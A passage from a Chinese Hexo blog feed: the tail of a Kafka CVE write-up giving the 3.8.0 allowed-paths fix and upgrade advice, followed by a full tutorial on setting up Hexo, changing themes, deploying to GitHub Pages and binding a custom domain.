src="https://s2.loli.net/2024/12/08/imRYpWTb3Orazxn.png"></p><p>跟踪到<code>org.apache.kafka.common.config.provider.DirectoryConfigProvider#read</code>方法即可发现文件读取</p><p><img src="https://s2.loli.net/2024/12/08/FT5zK9IYUJCjkSm.png"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>在3.8.0版本中在<code>configure</code>方法处加了白名单限制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configure</span><span class="params">(Map&lt;String, ?&gt; configs)</span> &#123;</span><br><span class="line">    allowedPaths = <span class="keyword">new</span> <span class="title class_">AllowedPaths</span>((String) configs.getOrDefault(ALLOWED_PATHS_CONFIG, <span class="literal">null</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>建议使用受影响应用程序的用户将kafka客户端升级到版本<code>&gt;=3.8.0</code>，并设置JVM系统属 性<code>org.apache.kafka.automatic.config providers=none</code>。  </p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>感觉直接漏洞利用难度还是很苛刻的，就看怎么泄露出存入的配置信息了</p>]]></content>
      
      
      <categories>
          
          <category> cve </category>
          
      </categories>
      
      
        <tags>
            
            <tag> security </tag>
            
            <tag> kafka </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客部署到github</title>
      <link href="/2024/11/21/hexo%E5%8D%9A%E5%AE%A2%E9%83%A8%E7%BD%B2%E5%88%B0github/"/>
      <url>/2024/11/21/hexo%E5%8D%9A%E5%AE%A2%E9%83%A8%E7%BD%B2%E5%88%B0github/</url>
      
        <content type="html"><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p><a href="https://git-scm.com/">Git</a></p><h2 id="安装nodejs"><a href="#安装nodejs" class="headerlink" title="安装nodejs"></a>安装nodejs</h2><p>可以直接上<a href="https://nodejs.org/zh-cn/download/prebuilt-installer">https://nodejs.org/zh-cn/download/prebuilt-installer</a></p><p>有多版本需求的也可以用nvm管理多个版本的nodejs</p><p><a href="https://www.yuque.com/ph0ebus/security/rupe9swqdeftppqg">nvm管理多版本nodejs环境</a></p><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>安装好后执行<code>hexo -version</code></p><p><img src="https://s2.loli.net/2024/11/21/aZ1CzvRIoMNQUBs.png"></p><h1 id="本地部署"><a href="#本地部署" class="headerlink" title="本地部署"></a>本地部署</h1><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>找一个喜欢的目录用于存放博客</p><p><img src="https://s2.loli.net/2024/11/21/qHdmIwioMxsnE37.png"></p><p>然后在当前目录下执行命令，这里hexo初始化一个默认模板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init [blog_name]</span><br><span class="line">cd [blog_name]</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/21/2Z3NSGQHJOx8LCm.png"></p><h2 id="预览"><a href="#预览" class="headerlink" title="预览"></a>预览</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean # 清除缓存文件，建议写完文章后执行一次</span><br><span class="line">hexo g# 生成 public 文件夹，写完文章执行</span><br><span class="line">hexo s# 启动 hexo 服务</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/21/bEJweLdkxivOto7.png"></p><p>然后访问<a href="http://localhost:4000/%E5%8D%B3%E5%8F%AF">http://localhost:4000/即可</a></p><p><img src="https://s2.loli.net/2024/11/21/SDQkAlrRm5wNK1J.png"></p><p>看到这个说明就部署成功了</p><h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h2><p><a href="https://hexo.io/themes/">Themes</a></p><p>这是官网的主题链接，目前有400+的主题，选择一个自己喜欢的主题</p><p>以 <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack">https://github.com/Ares-X/hexo-theme-freemind.bithack</a> 这个主题为例</p><p><img src="https://s2.loli.net/2024/11/21/EcbUZPK8nqGhuwj.png"></p><p>在 Readme 文档中往往写有如何使用的教程</p><p>主要是几个步骤</p><p>将主题下载到themes目录</p><p><img src="https://s2.loli.net/2024/11/21/KuoQB9fhieLUPjG.png"></p><p>安装环境运行的额外依赖包</p><p><img src="https://s2.loli.net/2024/11/21/Z3SPfEYb9oJNMer.png"></p><p>然后修改配置文件，启用该主题</p><p>复制主题的<code>_config.yml</code>到博客根目录下，改名为<code>_config.[theme_name].yml</code></p><p><img src="https://s2.loli.net/2024/11/21/URfyNk4uWJHMPE9.png"></p><p><img src="https://s2.loli.net/2024/11/21/ABb9nHRNZWymr8s.png"></p><p>然后给hexo根目录下的<code>_config.yml</code>文件中 theme 选项改为要换成的主题</p><p><img src="https://s2.loli.net/2024/11/21/FRdXAvCfIun9rTy.png"></p><p>然后根据主题修改配置文件<code>_config.[theme_name].yml</code>的内容进行个性化配置</p><p><a href="https://hexo.io/docs/configuration.html">https://hexo.io/docs/configuration.html</a></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 对照看着一下改就好:</span></span><br><span class="line"><span class="comment"># Hexo Configuration</span></span><br><span class="line"><span class="comment">## Docs: http://zespia.tw/hexo/docs/configure.html</span></span><br><span class="line"><span class="comment">## Source: https://github.com/tommy351/hexo/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Site </span></span><br><span class="line"><span class="attr">title:</span> <span class="string">My</span> <span class="string">Blog</span> <span class="comment">#博客名</span></span><br><span class="line"><span class="attr">subtitle:</span> <span class="string">to</span> <span class="string">be</span> <span class="string">continued...</span> <span class="comment">#副标题</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">My</span> <span class="string">blog</span> <span class="comment">#给搜索引擎看的，对网站的描述，可以自定义</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">Yourname</span> <span class="comment">#作者，在博客底部可以看到</span></span><br><span class="line"><span class="attr">email:</span> <span class="string">yourname@yourmail.com</span> <span class="comment">#你的联系邮箱</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span> <span class="comment">#中文。如果不填则默认英文</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL #这项暂不配置，绑定域名后，欲创建sitemap.xml需要配置该项</span></span><br><span class="line"><span class="comment">## If your site is put in a subdirectory, set url as &#x27;http://yoursite.com/child&#x27; and root as &#x27;/child/&#x27;</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">http://yoursite.com</span></span><br><span class="line"><span class="attr">root:</span> <span class="string">/</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span></span><br><span class="line"><span class="attr">tag_dir:</span> <span class="string">tags</span></span><br><span class="line"><span class="attr">archive_dir:</span> <span class="string">archives</span></span><br><span class="line"><span class="attr">category_dir:</span> <span class="string">categories</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Writing 文章布局、写作格式的定义，不修改</span></span><br><span class="line"><span class="attr">new_post_name:</span> <span class="string">:title.md</span> <span class="comment"># File name of new posts</span></span><br><span class="line"><span class="attr">default_layout:</span> <span class="string">post</span></span><br><span class="line"><span class="attr">auto_spacing:</span> <span class="literal">false</span> <span class="comment"># Add spaces between asian characters and western characters</span></span><br><span class="line"><span class="attr">titlecase:</span> <span class="literal">false</span> <span class="comment"># Transform title into titlecase</span></span><br><span class="line"><span class="attr">max_open_file:</span> <span class="number">100</span></span><br><span class="line"><span class="attr">filename_case:</span> <span class="number">0</span></span><br><span class="line"><span class="attr">highlight:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">backtick_code_block:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">line_number:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">tab_replace:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Category &amp; Tag</span></span><br><span class="line"><span class="attr">default_category:</span> <span class="string">uncategorized</span></span><br><span class="line"><span class="attr">category_map:</span></span><br><span class="line"><span class="attr">tag_map:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Archives 默认值为2，这里都修改为1，相应页面就只会列出标题，而非全文</span></span><br><span class="line"><span class="comment">## 2: Enable pagination</span></span><br><span class="line"><span class="comment">## 1: Disable pagination</span></span><br><span class="line"><span class="comment">## 0: Fully Disable</span></span><br><span class="line"><span class="attr">archive:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">category:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">tag:</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Server 不修改</span></span><br><span class="line"><span class="comment">## Hexo uses Connect as a server</span></span><br><span class="line"><span class="comment">## You can customize the logger format as defined in</span></span><br><span class="line"><span class="comment">## http://www.senchalabs.org/connect/logger.html</span></span><br><span class="line"><span class="attr">port:</span> <span class="number">4000</span></span><br><span class="line"><span class="attr">logger:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">logger_format:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Date / Time format 日期格式，可以修改成自己喜欢的格式</span></span><br><span class="line"><span class="comment">## Hexo uses Moment.js to parse and display date</span></span><br><span class="line"><span class="comment">## You can customize the date format as defined in</span></span><br><span class="line"><span class="comment">## http://momentjs.com/docs/#/displaying/format/</span></span><br><span class="line"><span class="attr">date_format:</span> <span class="string">YYYY-M-D</span></span><br><span class="line"><span class="attr">time_format:</span> <span class="string">H:mm:ss</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pagination 每页显示文章数，可以自定义，贴主设置的是10</span></span><br><span class="line"><span class="comment">## Set per_page to 0 to disable pagination</span></span><br><span class="line"><span class="attr">per_page:</span> <span class="number">10</span></span><br><span class="line"><span class="attr">pagination_dir:</span> <span class="string">page</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Disqus Disqus插件，我们会替换成“多说”，不修改</span></span><br><span class="line"><span class="attr">disqus_shortname:</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions 这里配置站点所用主题和插件，暂时默认</span></span><br><span class="line"><span class="comment">## Plugins: https://github.com/tommy351/hexo/wiki/Plugins</span></span><br><span class="line"><span class="comment">## Themes: https://github.com/tommy351/hexo/wiki/Themes</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">landscape</span></span><br><span class="line"><span class="attr">exclude_generator:</span></span><br><span class="line"><span class="attr">plugins:</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">hexo-generator-feed</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">hexo-generator-sitemap</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Deployment 站点部署到github要配置(重点！！！)</span></span><br><span class="line"><span class="comment">## Docs: http://zespia.tw/hexo/docs/deploy.html</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">  <span class="attr">repository:</span> <span class="string">//这里是需要填的，下面会讲</span></span><br><span class="line">  <span class="attr">branch:</span> <span class="string">master</span></span><br></pre></td></tr></table></figure><p>按需修改完后一套小连招即可重新部署</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean # 清除缓存文件，建议写完文章后执行一次</span><br><span class="line">hexo g# 生成 public 文件夹，写完文章执行</span><br><span class="line">hexo s# 启动 hexo 服务</span><br></pre></td></tr></table></figure><h1 id="部署到github托管"><a href="#部署到github托管" class="headerlink" title="部署到github托管"></a>部署到github托管</h1><p>没有github账号的先注册一个账号</p><p>设置git的全局变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;user_name&quot; # user_name填入GitHub用户名</span><br><span class="line">git config --global user.email &quot;user_email&quot; # user_email填入GitHub注册的邮箱</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/21/xI1bSfFK8qw3zG7.png"></p><p>新建一个 Repository，Repository name一定要是<code>你的用户名.github.io</code>，记得设为<code>public</code>，公开可见</p><p><img src="https://s2.loli.net/2024/11/21/gIcN7pMoRE3iQJv.png"></p><p><img src="https://s2.loli.net/2024/11/21/FCERKnY5LNVDlJ1.png"></p><p>然后在github配置ssh-key</p><p>访问<code>C:\Users\你的用户名\.ssh</code>目录，如果存在 id_rsa.pub 文件则复制其文件内容，如果不存在则生成一个</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;user.email&quot; # user.email为GitHub上注册的邮箱</span><br></pre></td></tr></table></figure><p><font style="color:rgb(64, 62, 62);">然后直接三个回车即可，默认不需要设置密码，没太大必要</font></p><p><font style="color:rgb(64, 62, 62);">复制内容后，这就是你的公钥，访问 </font><a href="https://github.com/settings/keys">https://github.com/settings/keys</a> <font style="color:rgb(64, 62, 62);">添加到github</font></p><p><img src="https://s2.loli.net/2024/11/21/tXZe5hTvDa8PWx4.png"></p><p><img src="https://s2.loli.net/2024/11/21/GT1NPKFtzcfjRdy.png"></p><p><font style="color:rgb(64, 62, 62);">然后我们在Git Bash中验证是否连接成功</font></p><p><img src="https://s2.loli.net/2024/11/21/xz7MpQR5bKPocS8.png"></p><p>修改<code>_config.yml</code>的配置项</p><p><img src="https://s2.loli.net/2024/11/21/HFVWPQaKnNOv9pj.png"></p><p>然后就可以准备开始部署了，在git之前需要下载插件，需要在刚刚的博客目录下安装哦</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>然后一套小连招部署到github</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo s</span><br><span class="line">hexo d     // 部署</span><br></pre></td></tr></table></figure><h1 id="配置个人域名"><a href="#配置个人域名" class="headerlink" title="配置个人域名"></a>配置个人域名</h1><p>在买域名的服务商处配置CNAME记录</p><p><img src="https://s2.loli.net/2024/11/21/ltRNZrvSbmqXnsa.png"></p><p>在仓库中找到设置</p><p><img src="https://s2.loli.net/2024/11/21/w5qFCD7zhjePlK9.png"></p><p>写上需要解析的域名</p><p><img src="https://s2.loli.net/2024/11/21/IofvMUmgHwGBRqK.png"></p><p>然后就可以了</p><h1 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h1><h3 id="fatal-not-a-git-repository-or-any-of-the-parent-directories-git"><a href="#fatal-not-a-git-repository-or-any-of-the-parent-directories-git" class="headerlink" title="fatal: not a git repository (or any of the parent directories): .git"></a>fatal: not a git repository (or any of the parent directories): .git</h3><p>虽然不知道为啥报错，但是<font style="color:rgb(85, 85, 85);">将hexo根目录下的.deploy_git&#x2F;删除掉，重新部署即可</font></p><p><img src="https://s2.loli.net/2024/11/21/PZSkOJhzq52XWs6.png"></p><p><img src="https://s2.loli.net/2024/11/21/8n2CZPsW7jdD4Om.png"></p>]]></content>
      
      
      <categories>
          
          <category> environment </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> environment </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
